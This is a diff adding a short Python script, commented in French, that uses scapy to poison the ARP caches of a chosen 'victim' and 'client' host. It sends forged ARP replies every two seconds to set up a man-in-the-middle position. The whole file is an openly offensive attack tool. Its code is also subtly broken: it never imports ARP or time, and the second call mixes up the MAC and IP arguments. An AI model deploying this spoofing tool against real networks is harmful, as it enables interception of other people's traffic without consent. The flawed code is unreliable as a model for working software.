@@ -1,0 +1,29 @@
+import optparse
+import scapy.all as scapy
+
+#définition des parser
+parser = optparse.OptionParser("utilité: -v ipvictime -c ipclient")
+parser.add_option("-v",dest='victime',type='string',help='IpVictime')
+parser.add_option("-c",dest='client',type='string',help='IpClient')
+options, args = parser.parse_args()
+
+#attribution de variables aux option des parser
+victimeIP = options.victime
+clientIP = options.client
+victimeMac = scapy.getmacbyip(victimeIP)
+clientMac = scapy.getmacbyip(clientIP)
+
+#fonction d'attaque, qui envoie une trame arp à la machine cible
+def attaque(clientIP, victimeMac, victimeIP):
+        packet = ARP()
+        packet.op = 2
+        packet.psrc = clientIP
+        packet.pdst = victimeIP
+        packet.hwdst = victimeMac
+        send (packet)
+
+#boucle qui envoie une trame au client et à la victime 
+while True:
+        attaque(victimeIP, victimeMac, clientIP)
+        attaque(clientIP, clientMac, victimeIP)
+        time.sleep(2)
